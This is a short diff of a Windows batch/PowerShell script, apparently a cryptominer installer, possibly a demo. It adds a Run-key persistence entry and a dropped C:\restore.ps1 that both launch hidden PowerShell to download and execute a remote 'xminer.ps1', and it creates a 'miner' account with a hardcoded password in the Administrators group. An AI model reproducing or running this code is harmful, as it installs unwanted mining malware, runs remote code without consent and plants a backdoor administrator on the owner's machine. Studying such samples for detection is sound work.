@@ -1,5 +1,7 @@
-
 cmd.exe /c "reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""xMiner"" /t REG_SZ /d ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/tmmdemo/automate/master/xminer.ps1'))"" /f"
+
+$args = "-w hidden IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/tmmdemo/automate/master/xminer.ps1'))"
+New-Item -Path "C:\" -Name "restore.ps1" -ItemType "file" -Value "Start-Process -FilePath powershell.exe -ArgumentList $($args)"
 
 cmd.exe /c "net user miner Mining4Ever! /add"
 cmd.exe /c "net localgroup Administrators miner /add"
